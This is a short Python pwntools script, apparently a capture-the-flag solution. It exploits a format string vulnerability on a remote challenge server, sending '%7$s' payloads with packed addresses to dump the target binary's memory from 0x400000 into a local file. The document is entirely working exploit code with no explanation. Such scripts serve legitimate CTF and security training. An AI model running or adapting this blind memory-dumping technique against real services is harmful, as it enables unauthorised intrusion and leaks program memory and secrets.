from pwn import *
context.log_level = 'WARNING'
conn=None
host, port ='chalp.hkcert21.pwnable.hk', 28132

def init():                                 #connect server
    global conn
    if conn is not None:
        conn.close()
    conn= remote(host,port)

def dump(addr):
    bdd= p64(addr)                          #change address into 64 bit
    if b'\n' in bdd:                        #because 64 bit, there is special case: '\n'
        return b''
    
    payload= b'%7$s' + b'|' + b'AAA' + bdd  #format payload: [fs] | [pad] [addr]
    init()
    conn.send(payload)
    response=conn.recvuntil(b'|')[:-1]
    print(f'[*] {hex(addr)} --> {response}')
    return response

addr=0x400000
while True:
    f=open('dump', 'ab')
    res=dump(addr) + b'\0'
    addr+=len(res)
    f.write(res)
    f.flush()